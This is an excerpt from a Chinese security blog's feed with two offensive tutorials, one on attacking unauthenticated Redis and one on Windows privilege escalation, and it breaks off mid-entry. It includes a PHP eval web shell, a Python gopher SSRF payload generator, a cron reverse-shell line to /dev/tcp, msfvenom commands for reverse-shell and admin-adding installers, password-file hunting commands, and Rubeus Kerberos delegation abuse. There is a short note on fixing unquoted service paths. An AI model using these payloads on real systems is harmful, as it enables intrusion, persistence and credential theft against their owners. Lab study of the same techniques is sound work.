  <entry>
    <title>redis的一些攻击方式</title>
    <link href="http://const27.com/2021/06/28/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://const27.com/2021/06/28/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2021-06-28T13:52:13.411Z</published>
    <updated>2021-06-28T13:43:22.470Z</updated>
    
    <content type="html"><![CDATA[<p>参考 <a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/">https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</a></p><p>Redis默认端口6379<br>如果存在未授权问题，那么任何人都可以往这台Redis服务器上传输命令</p><p>一般Redis攻击有<br>写shell（最常用），写密钥，写crontab反弹shell, info获得敏感信息,其中写密钥和写crontab不是那么的好用</p><p>在讲攻击之前，要讲一下RESP协议</p><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>Redis服务器与客户端通过RESP协议的通信。<br>resp协议从redis1.2引入。<br>这个协议把服务器与客户端之间的数据以一种序列化的形式处理并传输</p><p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code>，发送给服务器的命令就是放在数组中的BulkStrings类型<br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p><p>同时每个类型字节后紧跟着该类型的长度，然后是CRLF，然后是该类型的值</p><p>说了这么多，肯定不会很懂，上图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143000.png" alt="QQ截图20210219143000"></p><p>即发送的时候，是用三个元素的数组(*3),第一个元素是三个长度的BulkString($3)其值为set,第二个元素是四个长度的BulkSting($4)其值为name,第三个元素是四个长度长的BulkString($4)其值为test,服务器返回SimpleString（+）OK，以下类推</p><h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>是http协议出现常用的一个协议，SSRF的万金油。</p><p>格式：gopher://IP:port/_{TCP/IP数据流}</p><h2 id="如何redis远程链接"><a href="#如何redis远程链接" class="headerlink" title="如何redis远程链接"></a>如何redis远程链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h ip -p port</span><br><span class="line">xxx.xxx.xxx.xxx:x&gt;AUTH &quot;password&quot;  (未授权就不需要输入密码)</span><br></pre></td></tr></table></figure><h2 id="攻击方法一-写shell"><a href="#攻击方法一-写shell" class="headerlink" title="攻击方法一:写shell"></a>攻击方法一:写shell</h2><p>写shell的话,redis需执行的命令应该类似这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果你能直接redis -h ip -n 6379  未授权连接上redis服务器且权限够高，可以直接输入以下命令</span><br><span class="line">flushall  &#x2F;&#x2F;清空数据库</span><br><span class="line">set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;   &#x2F;&#x2F;为键名为1的键赋值</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php     &#x2F;&#x2F;设置数据存储到磁盘时的文件路径</span><br><span class="line">save    &#x2F;&#x2F;数据库全部保存至磁盘</span><br></pre></td></tr></table></figure><p>攻击脚本如下(主要用于ssrf)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python3</span><br><span class="line">import urllib</span><br><span class="line">protocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;</span><br><span class="line">ip&#x3D;&quot;192.168.163.128&quot;</span><br><span class="line">port&#x3D;&quot;6379&quot;</span><br><span class="line">shell&#x3D;&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span><br><span class="line">filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">path&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;</span><br><span class="line">passwd&#x3D;&quot;&quot;</span><br><span class="line">cmd&#x3D;[&quot;flushall&quot;,</span><br><span class="line"> &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),&#x2F;&#x2F;这里的IFS替换不是很理解是啥意思..</span><br><span class="line"> &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class="line"> &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class="line"> &quot;save&quot;</span><br><span class="line"> ]</span><br><span class="line">if passwd:</span><br><span class="line">cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))   &#x2F;&#x2F;如果需要密码，就把密码输入命令加入到cmd第一位</span><br><span class="line">payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;</span><br><span class="line">def redis_format(arr):</span><br><span class="line">CRLF&#x3D;&quot;\r\n&quot;</span><br><span class="line">redis_arr &#x3D; arr.split(&quot; &quot;)</span><br><span class="line">cmd&#x3D;&quot;&quot;</span><br><span class="line">cmd+&#x3D;&quot;*&quot;+str(len(redis_arr))</span><br><span class="line">for x in redis_arr:</span><br><span class="line">cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">cmd+&#x3D;CRLF</span><br><span class="line">return cmd</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">for x in cmd:</span><br><span class="line">payload +&#x3D; urllib.quote(redis_format(x))</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>这样的话，我们就得到了payload，直接curl一下，就写入shell了</p><h2 id="攻击方法二-info获取敏感信息"><a href="#攻击方法二-info获取敏感信息" class="headerlink" title="攻击方法二:info获取敏感信息"></a>攻击方法二:info获取敏感信息</h2><p>连上后 使用info命令</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143019.png" alt="QQ截图20210219143019"></p><h2 id="攻击方法三：写入ssh公钥"><a href="#攻击方法三：写入ssh公钥" class="headerlink" title="攻击方法三：写入ssh公钥"></a>攻击方法三：写入ssh公钥</h2><p>高版本不好用，因为高版本的redis权限是无法往/root目录写入的.<br>而这个方法则需要往/root/.ssh写入ssh公钥达到无密码ssh链接的目的</p><p>首先在攻击机上生成一对不需要密码的公钥私钥</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143031.png" alt="QQ截图20210219143031"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143103.png" alt="QQ截图20210219143103"></p><p>然后依次输入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">config set dirfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>然后ssh免密登录 ssh -i id_rsa root@ip</p><h2 id="攻击方法四：利用cron计划任务反弹shell"><a href="#攻击方法四：利用cron计划任务反弹shell" class="headerlink" title="攻击方法四：利用cron计划任务反弹shell"></a>攻击方法四：利用cron计划任务反弹shell</h2><p>仅在centos系统奏效，Ubuntu不行</p><ol><li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/</code>权限644也能执行</li><li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li></ol><p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令如下</span><br><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.131&#x2F;888 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>把上面那个脚本改改就能实现ssrf了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考 &lt;a href=&quot;https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/&quot;&gt;https://www.redteamin</summary>
      
    
    
    
    
    <category term="外围打点" scheme="http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>Windows提权方法汇总</title>
    <link href="http://const27.com/2021/06/28/Windows%E6%8F%90%E6%9D%83/"/>
    <id>http://const27.com/2021/06/28/Windows%E6%8F%90%E6%9D%83/</id>
    <published>2021-06-28T13:52:05.785Z</published>
    <updated>2021-02-19T08:50:44.681Z</updated>
    
    <content type="html"><![CDATA[<h2 id="无引号服务路径-（-Trusted-Service-Paths-）"><a href="#无引号服务路径-（-Trusted-Service-Paths-）" class="headerlink" title="无引号服务路径 （ Trusted Service Paths ）"></a>无引号服务路径 （ <strong>Trusted Service Paths</strong> ）</h2><p>先说实用度，比较被动，而且比较看脸。</p><p>Windows下服务的权限通常是SYSTEM。如果我们能够替换服务的启动程序为我们的恶意程序（如反弹shell），即相当于获得了SYSTEM权限，达到了提权的目的。<br>无引号服务路径有可能会导致这种情况的发生。<br>所谓无引号服务路径，就是服务启动程序的路径中包含了空格且未被引号包含起来。比如这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\floder1\service.exe</span><br></pre></td></tr></table></figure><p>因为空格的存在，Windows在启动服务找寻服务启动项时，它会按照以下顺序进行启动项寻找</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Some.exe</span><br><span class="line">C:\Program Files\Some Folder\Service.exe</span><br></pre></td></tr></table></figure><p>这就给了我们有机可乘的机会：如果我们在服务的上层目录有写入或完全控制权限，我们完全可以将一个可执行文件放在Windows搜寻服务启动项的更靠前顺序上。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143921.png" alt="QQ截图20210217143921"></p><p>我们用以下命令来搜索哪些服务路径没有包含引号</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>找到一个。接下来我们的思路可能就是在2345Explorer目录下创建一个Protect.exe了，所以我们要看看2345Explorer目录我们的权限如何。</p><p>先来一手whoami /all.发现自己是Users组的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143934.png" alt="QQ截图20210217143934"></p><p>然后使用icacls命令查看在2345Explorer目录的权限如何</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143945.png" alt="QQ截图20210217143945"></p><p>users组是完全控制权（F），那么我们直接用msfvenom构造一个反弹shell的exe。命名为Protect.exe，放入2345Explorer目录。我这里随便编码了一下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http -e x86&#x2F;shikata_ga_nai LHOST&#x3D;192.168.111.129 LPORT&#x3D;10068 -f exe -o Protect.exe</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144053.png" alt="QQ截图20210217144053"></p><p>然后我们现在是没有能力重启服务的。。只能等管理员重启服务或者机子重启。然后就拿到SYSTEM权限了。但是这里还有一个坑点，这个坑点是如果一个服务启动后在一定时间内未与 Service Control Manager(SCM) 通讯，就会被停止。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144102.png" alt="QQ截图20210217144102"></p><p>所以我们要在拿到shell后及时的转移进程或者添加管理员账户。<br>转移进程在msf中很简单，meterpreter中先用ps查看进程，随便找一个system权限，记住其pid，然后 migrate PID 即可完成进程迁移。</p><p>下面来说说防治方法吧。进入注册表修改窗口，在 HKEY_LOCAL_MACHINE &gt;&gt; SYSTEM &gt;&gt; CurrentControlSet &gt;&gt; Services 路径下找到存在漏洞的服务，修改其ImagePath，把路径前后加个引号就可了。</p><h2 id="易受攻击的服务（Vulnerable-Services-）"><a href="#易受攻击的服务（Vulnerable-Services-）" class="headerlink" title="易受攻击的服务（Vulnerable Services ）"></a>易受攻击的服务（<strong>Vulnerable Services</strong> ）</h2><p>同样看脸且被动</p><p>这个攻击方法大致分两类<br>1.替换服务的二进制文件。这个方法较为简单，如果对服务二进制文件所在目录有修改权，那么我们完全可以创建一个恶意程序来替换原有的二进制文件服务。这个比较简单，而且基本上攻击流程和<strong>Trusted Service Paths</strong>如出一辙，同样也是比较被动地等待重启服务才能弹shell，就不再演示了。<br>2.修改服务的属性。如果我们能修改服务的 <strong>BINARY_PATH_NAME</strong> 属性（这个属性用于指向服务的二进制文件），我们就可以通过设置 <strong>BINARY_PATH_NAME</strong> 的值为系统命令，然后重启服务时我们的系统命令会被执行。</p><p>对于后者，我们需要一款工具来快速揭示出我们能修改哪些服务的属性。<br>这个工具我们采用accesschk.exe，它是微软产出的，基本不会报毒。</p><p>我们通过该工具执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * &#x2F;accepteula</span><br><span class="line">or</span><br><span class="line">accesschk.exe -uwcqv &quot;Users&quot; * &#x2F;accepteula</span><br><span class="line">来查看Users组（根据实际情况来填哪个组）对哪些服务有哪些权限</span><br></pre></td></tr></table></figure><p>如果对某个服务有service_all_access或者以下权限，就说明能对其属性进行修改。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144124.png" alt="QQ截图20210217144124"></p><p>比如我们对Spooler服务有service_all_access权限，我们就可以这样做。<br>通过修改其binPath为恶意指令，然后等待管理员重启服务，我们的恶意指令就会被执行。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144141.png" alt="QQ截图20210217144141"></p><h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a><strong>AlwaysInstallElevated</strong></h2><p>如果windows启用了如下注册表项</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">“AlwaysInstallElevated”&#x3D;dword:00000001 </span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">“AlwaysInstallElevated”&#x3D;dword:00000001</span><br></pre></td></tr></table></figure><p>那么所有msi（windows应用安装程序）都会以SYSTEM权限运行。此时如果我们执行一个恶意msi程序，即可达到提权目的<br>同时需要注意的一点是，这个注册表项不一定总是存在的。（比如我的实验机</p><p>我们可以通过reg query来验证这两条注册表项的情况</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p>若均为1，我们就可以通过msfvenom生成恶意msi来提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;adduser USER&#x3D;rottenadmin PASS&#x3D;P@ssword123! -f msi -o rotten.msi</span><br></pre></td></tr></table></figure><p>然后执行，获得一个管理员账户。</p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><em>Unattend.xml</em> <em>sysprep.xml和sysprep.inf文件</em><code>GPP.xml</code> 存在着一定信息泄露，他们通常存在于以下路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Panther\</span><br><span class="line">C:\Windows\Panther\Unattend\</span><br><span class="line">C:\Windows\System32\</span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure><p>找到后，找到 <em>Unattend.xml</em> 文件中的 <UserAccounts> 标签。就有可能找到用户的加密后的密码。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;UserAccounts&gt;</span><br><span class="line">    &lt;LocalAccounts&gt;</span><br><span class="line">        &lt;LocalAccount&gt;</span><br><span class="line">            &lt;Password&gt;</span><br><span class="line">                &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ&#x3D;&lt;&#x2F;Value&gt; &#x2F;&#x2F;PASSWORD</span><br><span class="line">                &lt;PlainText&gt;false&lt;&#x2F;PlainText&gt;</span><br><span class="line">            &lt;&#x2F;Password&gt;</span><br><span class="line">            &lt;Description&gt;Local Administrator&lt;&#x2F;Description&gt;</span><br><span class="line">            &lt;DisplayName&gt;Administrator&lt;&#x2F;DisplayName&gt;</span><br><span class="line">            &lt;Group&gt;Administrators&lt;&#x2F;Group&gt;</span><br><span class="line">            &lt;Name&gt;Administrator&lt;&#x2F;Name&gt;</span><br><span class="line">        &lt;&#x2F;LocalAccount&gt;</span><br><span class="line">    &lt;&#x2F;LocalAccounts&gt;</span><br><span class="line">&lt;&#x2F;UserAccounts&gt;</span><br><span class="line">一些敏感文件查询指令</span><br><span class="line">C:\Users\user\Desktop&gt; dir C:\ &#x2F;s &#x2F;b &#x2F;c | findstr &#x2F;sr \*password\*</span><br><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure><h2 id="基于资源的域委派攻击"><a href="#基于资源的域委派攻击" class="headerlink" title="基于资源的域委派攻击"></a>基于资源的域委派攻击</h2><p>refer:<a href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p><h4 id="原理的几个点："><a href="#原理的几个点：" class="headerlink" title="原理的几个点："></a>原理的几个点：</h4><p>1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。<br>2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。<br>3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: <code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h4><p>假设开启基于资源的约束性委派机器为A<br>1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。<br>2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派<br>3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。<br>4.用ST2访问A的CIFS服务，权限获得。</p><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>这个攻击说白了就是个提权…</p><p>首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。</p><p>我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png" alt="QQ截图20210217135833"></p><p>可以获得域控WIN版本</p><p>然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。<br>直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png" alt="QQ截图20210217135859"></p><p>我们依旧使用powerview。先调用<br><code>Get-DomainUser -Identity username -Properties objectsid</code>来获取当前用户SID<br>然后<code>Get-DomainObjectAcl -Identity 主机名 | ?&#123;$_.SecurityIdentifier -match &quot;刚刚得到的SID&quot;&#125;</code> 查看当前用户对某台主机是否有写权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png" alt="QQ截图20210217140628"></p><p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。<br>如图看到我们对WIN7进行操作</p><p>好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png" alt="QQ截图20210217140659"></p><p>好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值 ，这个操作我们用powerview实现。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  </span><br><span class="line">#这儿的sid是我们创建的#机器用户#evilsystem的sid</span><br><span class="line">$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png" alt="QQ截图20210217140726"></p><p>至于机器账户SID怎么获得，powerview下的 <code>get-domiancomputer hacksystem</code><br>然后使用<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> 查看委派是否设置成功</p><p><code>Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose </code>此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值</p><p>现在都统统设置好了，开始下一步吧。<br>网上一般用的rubeus，这里我用kekeo吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx</span><br></pre></td></tr></table></figure><p>本地运算出机器用户ntlm hash 这里借用一下别人的图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png" alt="QQ截图20210217140944"></p><p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> 写入票据</p><p>然后我在本机使用以上方法后klist一下，发现确实存在票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png" alt="QQ截图20210217140737"></p><p>但是dir \test1\c$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了</p><h4 id="敏感用户不可委派的绕过"><a href="#敏感用户不可委派的绕过" class="headerlink" title="敏感用户不可委派的绕过"></a>敏感用户不可委派的绕过</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png" alt="QQ截图20210217141050"></p><p>若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。</p><p>我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>继续实验administrator，发现确实是这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png" alt="QQ截图20210217141131"></p><p>此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png" alt="QQ截图20210217141313"></p><p>可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具<br><a href="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a><br>但实际上rubeus也能完成票据修改<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png" alt="QQ截图20210217141325"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png" alt="QQ截图20210217141339"></p><p>完事</p><h2 id="POTATO-家族"><a href="#POTATO-家族" class="headerlink" title="POTATO 家族"></a>POTATO 家族</h2><h3 id="hot-potato"><a href="#hot-potato" class="headerlink" title="hot potato"></a>hot potato</h3><p>热土豆提权。很早前就听说过了，但一直没去了解过。前置知识是ntlm relay,可以去了解了解。 potato家族有很多，hot potato只是其中一种提权方式。<br>我环境有问题，不能很好的复现🙃，抓包分析啥的先咕咕吧。</p><p><a href="https://github.com/foxglovesec/Potato%F0%9F%91%88%E5%B7%A5%E5%85%B7">https://github.com/foxglovesec/Potato👈工具</a><br><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a> 👈HOT POTATO技术文档，国内基本上翻译这个来的。</p><p>提权步骤大概是这个流程<br>1.本地nbns服务欺骗<br>2.wpad劫持<br>3.HTTP-&gt;SMB 的 ntlm relay</p><p>1.本地nbns服务欺骗</p><p>Windows域名解析规则是<br>本地HOST文件-》dns查询-》NBNS或者LLMNR查询<br>一旦本地发出NBNS查询，我们本地就可以迅速响应，啪的一下就响应了，很快啊，本地发包很快，只要发出NBNS包基本上都能被我们本地发包响应。<br>但是以上步骤还是有一些细节的：我们当前并非管理员权限，大几率是无法嗅探本地流量的,如果我们能够事先知道目标主机期望NBNS查询获得的主机名，我们可以伪造一个响应，对发送NBNS查询的那个主机快速的大量发送NBNS响应 .但是nbns流量包还有个叫特征码的东西，请求包和响应包的特征码必须相同，所以我们被迫发送65536个包爆破这个特征码——本地发包速度很快，本地NBNS欺骗成功率基本上在100%。</p><p>2.WPAD劫持</p><p>NBNS欺骗后我们就可以劫持WPAD的域名，把自己伪造称WPAD并返回自定义的PAC文件。意味着我们可以把本地发出的所有流量重定向。</p><p>3.RELAY</p><p>在现在这个年代，SMB-&gt;SMB的relay很少用到了，微软 禁用了同协议的NTLM认证 ，成功率很低。<br>但是HTTP-&gt;SMB的relay还是有的。HOT POTATO就是利用的这一点。<br>我们可以把主机发出的HTTP请求重定向到我们自定义的网页A，而网页A需要NTLM认证，我们就可以进行HTTP-&gt;SMB的relay’了。当HTTP请求来自于高权限的账户时，例如是来自windows 更新服务的请求，命令就会以”NT AUTHORITY\SYSTEM”权限运行。</p><p>HOT POTATO 根据Windows版本的不同，需要等待高权限用户NTLM认证来到的时间也不同。一般来说，<br>WIN7是瞬间就可以提权的<br>Windows Server 2012 R2,Windows Server 2012,Windows 8.1,Windows 8有一个自动更新机制，会每天下载证书信任列表(CTLs)<br>,etc</p><h2 id="MYSQL下的提权技术"><a href="#MYSQL下的提权技术" class="headerlink" title="MYSQL下的提权技术"></a>MYSQL下的提权技术</h2><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" 